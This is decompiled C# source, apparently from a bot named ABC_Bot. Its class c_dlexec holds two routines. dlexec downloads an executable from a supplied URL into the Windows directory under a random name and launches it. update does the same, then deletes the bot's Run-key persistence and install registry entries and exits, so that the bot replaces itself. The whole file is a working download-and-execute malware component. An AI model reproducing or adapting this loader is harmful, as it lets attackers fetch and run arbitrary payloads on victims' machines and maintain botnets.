using System;
using System.Diagnostics;
using System.Net;
using Microsoft.VisualBasic.CompilerServices;

namespace ABC_Bot;

public class c_dlexec
{
	[DebuggerNonUserCode]
	public c_dlexec()
	{
	}

	public static object dlexec(string url)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		WebClient webClient = default(WebClient);
		int num5 = default(int);
		Random random = default(Random);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 217:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0012;
						case 4:
							goto IL_001b;
						case 5:
							goto IL_0025;
						case 6:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 7:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0025:
					num = 5;
					webClient.DownloadFile(url, Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(main.windir, (object)"\\"), (object)num5.ToString()), (object)".exe")));
					break;
					IL_001b:
					num = 4;
					num5 = random.Next();
					goto IL_0025;
					IL_0009:
					num = 2;
					webClient = new WebClient();
					goto IL_0012;
					IL_0012:
					num = 3;
					random = new Random();
					goto IL_001b;
					end_IL_0000_2:
					break;
				}
				num = 6;
				NewLateBinding.LateCall((object)null, typeof(Process), "Start", new object[1] { Operators.AddObject(Operators.AddObject(Operators.AddObject(main.windir, (object)"\\"), (object)num5.ToString()), (object)".exe") }, (string[])null, (Type[])null, (bool[])null, true);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 217;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		object result = default(object);
		return result;
	}

	public static object update(string url)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		WebClient webClient = default(WebClient);
		Random random = default(Random);
		int num5 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 268:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0012;
						case 4:
							goto IL_001b;
						case 5:
							goto IL_0025;
						case 6:
							goto IL_0059;
						case 7:
							goto IL_0071;
						case 8:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 9:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0071:
					num = 7;
					mod_registry.RegDelete("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\SecurityFirewall\\install");
					break;
					IL_0059:
					num = 6;
					mod_registry.RegDelete("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" + main.name);
					goto IL_0071;
					IL_0009:
					num = 2;
					webClient = new WebClient();
					goto IL_0012;
					IL_0012:
					num = 3;
					random = new Random();
					goto IL_001b;
					IL_001b:
					num = 4;
					num5 = random.Next();
					goto IL_0025;
					IL_0025:
					num = 5;
					webClient.DownloadFile(url, Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(main.windir, (object)"\\"), (object)num5.ToString()), (object)".exe")));
					goto IL_0059;
					end_IL_0000_2:
					break;
				}
				num = 8;
				NewLateBinding.LateCall((object)null, typeof(Process), "Start", new object[1] { Operators.AddObject(Operators.AddObject(Operators.AddObject(main.windir, (object)"\\"), (object)num5.ToString()), (object)".exe") }, (string[])null, (Type[])null, (bool[])null, true);
				ProjectData.EndApp();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 268;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		object result = default(object);
		return result;
	}
}
